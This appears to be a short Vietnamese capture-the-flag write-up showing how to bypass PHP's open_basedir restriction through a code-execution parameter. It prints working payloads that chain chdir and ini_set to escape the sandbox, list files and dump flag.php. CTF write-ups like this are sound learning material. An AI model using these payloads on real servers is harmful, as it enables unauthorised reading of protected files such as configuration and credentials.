# Solution


Sau khi nhìn vào source code mình nhận ra ngay đây là một dạng về bypass `open_basedir`. Về POC thì xem tại <https://github.com/Blaklis/my-challenges/tree/master/phuck3> hoặc tại <https://flagbot.ch/posts/phuck3/>.

Thử tạo một thư mục con với `mkdir()` thì bị báo là không đủ quyền 🥺

`?c=print_r(scandir('.'));`

=> `Array ( [0] => . [1] => .. [2] => tmp )`

hmm, author tạo sẵn folder `tmp` cho luôn thế thì càng tốt.

Tiếp theo áp dụng POC:
`?c=chdir('tmp');ini_set('open_basedir', '..');chdir('..');print_r(scandir('..'));`

```
Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php [4] => php-fpm.sock [5] => sandbox [6] => source.php )
```

Final payload:
```
?c=chdir('tmp');ini_set('open_basedir', '..');chdir('..');chdir('..');ini_set('open_basedir', '/');show_source('flag.php');
```